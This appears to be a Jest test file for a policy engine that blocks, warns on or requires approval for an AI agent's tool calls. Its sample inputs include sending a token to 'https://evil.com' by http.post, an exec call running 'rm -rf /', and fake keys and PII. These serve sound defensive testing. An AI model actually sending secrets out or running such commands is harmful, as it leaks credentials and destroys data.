const { PolicyEngine } = require('../src/policy-engine');

const policy = {
  rules: [
    {
      id: 'block-secret-exfil',
      severity: 'critical',
      when: { tool: ['slack.send', 'email.send', 'http.*'], data_classification: ['secret'] },
      action: 'block',
      message: 'Cannot send secrets via outbound tools'
    },
    {
      id: 'block-shell',
      severity: 'critical',
      when: { tool: ['exec', 'shell', 'bash'] },
      action: 'block',
      message: 'Shell execution blocked by policy'
    },
    {
      id: 'warn-pii-output',
      severity: 'high',
      when: { type: 'outbound', data_classification: ['pii'] },
      action: 'warn',
      message: 'PII detected in outbound message'
    },
    {
      id: 'block-high-risk-untrusted',
      severity: 'high',
      when: { tool_risk: ['critical', 'high'], source: ['mcp', 'untrusted'] },
      action: 'require_approval',
      message: 'High-risk tool call from untrusted source requires approval'
    },
    {
      id: 'log-all-reads',
      severity: 'low',
      when: { tool: ['*.read', '*.get', '*.list'] },
      action: 'log',
    }
  ]
};

let engine;

beforeEach(() => {
  engine = new PolicyEngine(policy);
});

describe('Policy Engine', () => {
  test('blocks secret exfiltration via slack', () => {
    const d = engine.evaluate({
      type: 'tool_call',
      tool: 'slack.send',
      args: { text: 'Here is the key: sk-proj-abcdefghijklmnopqrstuvwxyz1234567890' }
    });
    expect(d.action).toBe('block');
    expect(d.ruleId).toBe('block-secret-exfil');
    expect(d.classifications.secret.length).toBeGreaterThan(0);
  });

  test('blocks shell execution', () => {
    const d = engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls -la' } });
    expect(d.action).toBe('block');
    expect(d.ruleId).toBe('block-shell');
  });

  test('allows safe tool call', () => {
    const d = engine.evaluate({ type: 'tool_call', tool: 'calendar.read', args: { date: '2026-03-28' } });
    expect(['allow', 'log']).toContain(d.action);
  });

  test('warns on PII in outbound', () => {
    const d = engine.evaluate({ type: 'outbound', text: 'Your SSN is 123-45-6789' });
    expect(d.action).toBe('warn');
    expect(d.classifications.pii.length).toBeGreaterThan(0);
  });

  test('blocks http request with secrets', () => {
    const d = engine.evaluate({
      type: 'tool_call',
      tool: 'http.post',
      args: { url: 'https://evil.com', body: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz' }
    });
    expect(d.action).toBe('block');
  });

  test('require approval for high-risk from untrusted source', () => {
    const d = engine.evaluate({
      type: 'tool_call',
      tool: 'email.send',
      args: { to: 'user@example.com', body: 'Hello' },
      context: { source: 'mcp' }
    });
    expect(d.action).toBe('require_approval');
  });

  test('classifies secrets correctly', () => {
    const c = engine.classify('My key is sk-proj-abc123def456ghi789jklmnop and AWS AKIAIOSFODNN7EXAMPLE');
    expect(c.secret.length).toBeGreaterThanOrEqual(2);
  });

  test('classifies PII correctly', () => {
    const c = engine.classify('SSN: 123-45-6789, email: test@example.com, card: 4111 1111 1111 1111');
    expect(c.pii.length).toBeGreaterThanOrEqual(2);
  });

  test('scores tool risk correctly', () => {
    expect(engine.getToolRisk('file.read')).toBe('low');
    expect(engine.getToolRisk('slack.send')).toBe('high');
    expect(engine.getToolRisk('shell.exec')).toBe('critical');
    expect(engine.getToolRisk('db.delete')).toBe('critical');
    expect(engine.getToolRisk('unknown.custom')).toBe('medium');
  });

  test('monitor mode logs instead of blocking', () => {
    const monitorEngine = new PolicyEngine(policy, { mode: 'monitor' });
    const d = monitorEngine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'rm -rf /' } });
    expect(d.action).toBe('log');
    expect(d.ruleId).toBe('block-shell');
  });

  test('records execution trace', () => {
    // Run an evaluation first
    engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls' } });
    const trace = engine.getTrace();
    expect(trace.length).toBeGreaterThan(0);
    expect(trace[0].decision).toBeTruthy();
    expect(typeof trace[0].latencyMs).toBe('number');
  });

  test('tracks stats', () => {
    // Run some evaluations
    engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls' } });
    engine.evaluate({ type: 'tool_call', tool: 'file.read', args: { path: '/tmp' } });
    const stats = engine.getStats();
    expect(stats.total).toBeGreaterThan(0);
    expect(stats.blocked).toBeGreaterThan(0);
  });

  test('simulate runs all events', () => {
    const sim = engine.simulate([
      { type: 'tool_call', tool: 'exec', args: { command: 'ls' } },
      { type: 'tool_call', tool: 'file.read', args: { path: '/tmp/test' } },
      { type: 'tool_call', tool: 'slack.send', args: { text: 'sk-proj-abc123456789012345678901234567890' } },
    ]);
    expect(sim.total).toBe(3);
    expect(sim.blocked).toBeGreaterThanOrEqual(2);
  });

  test('highest severity rule wins', () => {
    const d = engine.evaluate({
      type: 'tool_call',
      tool: 'http.post',
      args: { body: 'sk-proj-abc123456789012345678901234567890' },
      context: { source: 'mcp' }
    });
    expect(d.ruleId).toBe('block-secret-exfil');
  });

  test('evaluation is fast (<5ms avg)', () => {
    const start = Date.now();
    for (let i = 0; i < 100; i++) {
      engine.evaluate({ type: 'tool_call', tool: 'file.read', args: { path: '/tmp' } });
    }
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(500);
  });
});
